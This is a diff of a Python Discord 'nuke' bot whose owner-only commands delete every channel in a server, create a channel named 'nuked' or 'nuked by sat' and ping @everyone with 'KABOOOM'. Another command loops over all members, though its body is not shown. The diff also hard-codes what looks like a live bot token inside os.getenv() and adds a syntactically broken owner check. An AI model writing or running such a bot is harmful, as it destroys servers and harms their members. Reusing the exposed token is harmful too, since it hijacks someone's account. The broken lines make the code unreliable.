@@ -15,14 +15,15 @@ async def abomb(ctx):
 
   if ctx.author.id == owner:
 
+
     for chan in ctx.guild.channels:
         try:
             await chan.delete()
         except:
             pass
 
-    await ctx.guild.create_text_channel('nuked')
-    channel = discord.utils.get(client.get_all_channels(), guild=ctx.author.guild, name='nuked')
+    await ctx.guild.create_text_channel('nuked by sat')
+    channel = discord.utils.get(client.get_all_channels(), guild=ctx.author.guild, name='nuked by sat')
     await channel.send("@everyone\nKABOOOM\n")
 
   else:
@@ -32,7 +33,7 @@ async def abomb(ctx):
 @client.command()
 async def bbomb(ctx):
 
-  if ctx.author.id == owner:
+  if ctx.author.id == owner:847903468685623368
 
 
     for member in ctx.guild.members:
@@ -102,10 +103,11 @@ async def e(ctx):
 
     await ctx.guild.create_text_channel('nuked')
     channel = discord.utils.get(client.get_all_channels(), guild=ctx.author.guild, name='nuked')
-    await channel.send("KABOOOM\ndiscord.gg/VMXyEHtMPj")
+    await channel.send("KABOOOM")
+
   else:
     await ctx.send("No")
 
 
-client.run(os.getenv('TOKEN'))
+client.run(os.getenv('ODU1MDkxOTgwNzQzOTk5NTIx.YMtcdw.NDeIXQQjSLgXnGUm__70iau0358'))
 
